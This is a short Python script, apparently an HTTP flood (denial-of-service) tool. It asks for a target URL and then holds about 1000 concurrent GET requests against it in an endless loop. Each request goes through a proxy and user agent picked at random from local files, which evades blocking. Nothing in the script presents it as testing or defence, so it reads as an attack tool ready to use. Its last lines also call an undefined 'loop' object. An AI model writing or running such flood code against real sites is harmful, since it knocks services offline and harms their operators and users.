import aiohttp
import asyncio
import random

ua = open('ua.txt', 'r').read().split('\n')
proxy_list = open('proxy.txt', 'r').read().split('\n')


num_tasks = 1000

async def hoangnay(session, url):
    headers = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/octet-stream",
        "Accept-Language": "en-US,en;q=0.9,ja;q=0.8",
        "Custom-Header": "value",
        "Another-Header": "value",
        "connection":"Keep-Alive"
    }
    
    
    proxy = "http://"+random.choice(proxy_list)

    try:
        async with session.get(url, headers=headers, proxy=proxy,timeout = 5) as response:
            status = response.status
            text = await response.text()
            return status, text
    except aiohttp.ClientError as e:
        print("An error occurred:", e)
        return None, None

async def main():
    url = input("Enter URL: ")
    tasks = []
    connector = aiohttp.TCPConnector(limit_per_host=num_tasks)  # Giới hạn số lượng kết nối đồng thời

    async with aiohttp.ClientSession(connector=connector) as session:
        for _ in range(num_tasks):
            task = asyncio.create_task(hoangnay(session, url))
            tasks.append(task)

        while True:
            completed, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)

            for task in completed:
                status, response = await task
                if status is not None:
                    print("Status:", status)

                tasks.remove(task) 

                new_task = asyncio.create_task(hoangnay(session, url))
                tasks.append(new_task)

            if len(pending) > 0:
                await asyncio.sleep(0.01) 
asyncio.run(main())

try:
    loop.run_until_complete(main())
except KeyboardInterrupt:
    pass
